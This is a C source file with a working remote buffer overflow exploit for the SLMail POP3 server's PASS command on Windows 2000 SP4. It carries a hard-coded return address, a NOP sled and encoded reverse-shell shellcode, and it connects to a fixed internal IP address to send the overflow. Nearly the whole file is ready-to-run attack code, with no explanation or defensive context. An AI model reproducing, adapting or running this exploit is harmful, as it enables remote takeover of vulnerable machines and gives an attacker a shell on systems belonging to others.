#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
  
#define retadd "\x8f\x35\x4a\x5f" /*win2k server sp4 0x773a459f*/
#define port 110
 
/* revshell العراق القراصنة المجموعة*/
char shellcode[] =
"\xdb\xda\xba\x98\x96\x47\x79\xd9\x74\x24\xf4\x5f\x33\xc9\xb1" 
"\x52\x31\x57\x17\x83\xc7\x04\x03\xcf\x85\xa5\x8c\x13\x41\xab"
"\x6f\xeb\x92\xcc\xe6\x0e\xa3\xcc\x9d\x5b\x94\xfc\xd6\x09\x19"
"\x76\xba\xb9\xaa\xfa\x13\xce\x1b\xb0\x45\xe1\x9c\xe9\xb6\x60"
"\x1f\xf0\xea\x42\x1e\x3b\xff\x83\x67\x26\xf2\xd1\x30\x2c\xa1"
"\xc5\x35\x78\x7a\x6e\x05\x6c\xfa\x93\xde\x8f\x2b\x02\x54\xd6"
"\xeb\xa5\xb9\x62\xa2\xbd\xde\x4f\x7c\x36\x14\x3b\x7f\x9e\x64"
"\xc4\x2c\xdf\x48\x37\x2c\x18\x6e\xa8\x5b\x50\x8c\x55\x5c\xa7"
"\xee\x81\xe9\x33\x48\x41\x49\x9f\x68\x86\x0c\x54\x66\x63\x5a"
"\x32\x6b\x72\x8f\x49\x97\xff\x2e\x9d\x11\xbb\x14\x39\x79\x1f"
"\x34\x18\x27\xce\x49\x7a\x88\xaf\xef\xf1\x25\xbb\x9d\x58\x22"
"\x08\xac\x62\xb2\x06\xa7\x11\x80\x89\x13\xbd\xa8\x42\xba\x3a"
"\xce\x78\x7a\xd4\x31\x83\x7b\xfd\xf5\xd7\x2b\x95\xdc\x57\xa0"
"\x65\xe0\x8d\x67\x35\x4e\x7e\xc8\xe5\x2e\x2e\xa0\xef\xa0\x11"
"\xd0\x10\x6b\x3a\x7b\xeb\xfc\x85\xd4\xf2\xc0\x6d\x27\xf4\x39"
"\xd5\xae\x12\x53\x39\xe7\x8d\xcc\xa0\xa2\x45\x6c\x2c\x79\x20"
"\xae\xa6\x8e\xd5\x61\x4f\xfa\xc5\x16\xbf\xb1\xb7\xb1\xc0\x6f"
"\xdf\x5e\x52\xf4\x1f\x28\x4f\xa3\x48\x7d\xa1\xba\x1c\x93\x98"
"\x14\x02\x6e\x7c\x5e\x86\xb5\xbd\x61\x07\x3b\xf9\x45\x17\x85"
"\x02\xc2\x43\x59\x55\x9c\x3d\x1f\x0f\x6e\x97\xc9\xfc\x38\x7f"
"\x8f\xce\xfa\xf9\x90\x1a\x8d\xe5\x21\xf3\xc8\x1a\x8d\x93\xdc"
"\x63\xf3\x03\x22\xbe\xb7\x34\x69\xe2\x9e\xdc\x34\x77\xa3\x80"
"\xc6\xa2\xe0\xbc\x44\x46\x99\x3a\x54\x23\x9c\x07\xd2\xd8\xec"
"\x18\xb7\xde\x43\x18\x92";
  
struct sockaddr_in plm,lar,target;
  
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
  
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2969);
    memset(buffer, 0x00, 2969);
    char *off = malloc(2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(8);
    memset(nop, 0x90, 8);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);
 
    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("192.168.1.62");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs); 
}
